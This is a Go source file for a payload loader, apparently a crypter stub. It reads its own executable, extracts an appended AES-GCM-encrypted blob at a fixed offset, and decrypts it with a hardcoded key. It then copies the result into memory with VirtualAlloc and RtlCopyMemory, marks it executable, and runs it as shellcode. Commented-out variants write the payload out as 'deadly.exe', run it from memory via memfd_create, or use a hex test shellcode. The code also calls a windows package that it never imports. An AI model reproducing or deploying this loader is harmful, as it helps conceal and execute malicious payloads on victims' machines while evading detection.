package main


// import "github.com/amenzhinsky/go-memexec"

import (
	// "fmt"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"io/ioutil"
	"os"
	// "os/exec"
	"syscall"
	// "unsafe"
	// 	"encoding/hex"
	"fmt"
	"log"
	"unsafe"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)
// const (
// 	mfdCloexec     = 0x0001
// 	memfdCreateX64 = 319
// 	memfdCreate = 319
// 	fork           = 57
// )

//key if you encrypt all of your stuff 
const key = "3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd53b574954d804529fd4407a5738dac878b9c42185fd38d90ecb5abffa16afecd53b574954d804529fd4407a5738dac878b9c42185fd38d90ecb5abffa16afecd"

/*
Checks for errors when reading in files 
*/
func check(e error) {
    if e != nil {
        panic(e)
    }
}

func createHash(key string) []byte {
	hash := sha256.Sum256([]byte(key))
	return hash[:]
}

func decrypt(data []byte, passphrase string) []byte {
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func decryptFile(filename string, passphrase string) []byte {
	data, _ := ioutil.ReadFile(filename)
	f, _ := os.Create(filename)
	f.Write(decrypt(data, passphrase))
	f.Close()
	return decrypt(data, passphrase)
}

// func runFromMemory(procName string, buffer []byte) {
// 	fdName := "" // *string cannot be initialized
// 	fd, _, _ := syscall.Syscall(memfdCreate, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)

// 	_, _ = syscall.Write(int(fd), buffer)

// 	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
// 	_ = syscall.Exec(fdPath, []string{procName}, nil)
// }

func main() {
	filename := os.Args[0] 
    // skipBytes := 2290120             // how many bytes to skip 2,455,040 Mac 2,152,960  2,298,520 2,298,520
    skipBytes := 2702848        // how many bytes to skip 2,455,040 Windows 2,455,040   2,152,960 2,455,040 2,454,528 2,455,040 2,622,976 b

	data, _ := ioutil.ReadFile(filename) 

	buf := []byte{}

	for i, d:= range data {
		if i >= skipBytes{
			buf = append(buf, d)
		}
	}
	/* For mac/linux */
	// b, _ := os.Create(filename)
	// b.Write(buf)
	// b.Close()

	// decryptFile(filename, key)
	// command := exec.Command(filename)
	// command.Run()


	/* For windows */
	// b, _ := os.Create("./deadly.exe")
	// b.Write(buf)
	// b.Close()

	// decryptFile("./deadly.exe", key)
	dec := []byte{}

	dec = decrypt(buf, key)
	
	// b, _ := os.Create("./deadly")
	// b.Write(dec)
	// b.Close()

	// target, _ := ioutil.ReadFile("./deadly.exe")

	// runFromMemory("PayloadEnc", dec)
	// exe, err := memexec.New(dec)
	// if err != nil {
	// 	return 
	// }
	// defer exe.Close()

	// cmd := exe.Command()
	// cmd.Output() 
	// command := exec.Command("deadly.exe")
	// // command.Run()

    // if err := command.Run(); err != nil { 
    //     fmt.Println("Error: ", err)
	// }   

	// shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	verbose := true
	debug := true
	shellcode := dec
	
	fmt.Println(shellcode)
	
	if debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	if debug {
		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
	}
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	if debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
	}
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	if verbose {
		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
	}

	if debug {
		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
	}
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}
	if verbose {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if debug {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	if verbose {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if debug {
		fmt.Println("[DEBUG]Executing Shellcode")
	}
	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)

	if errSyscall != 0 {
		log.Fatal(fmt.Sprintf("[!]Error executing shellcode syscall:\r\n%s", errSyscall.Error()))
	}
	if verbose {
		fmt.Println("[+]Shellcode Executed")
	}
}

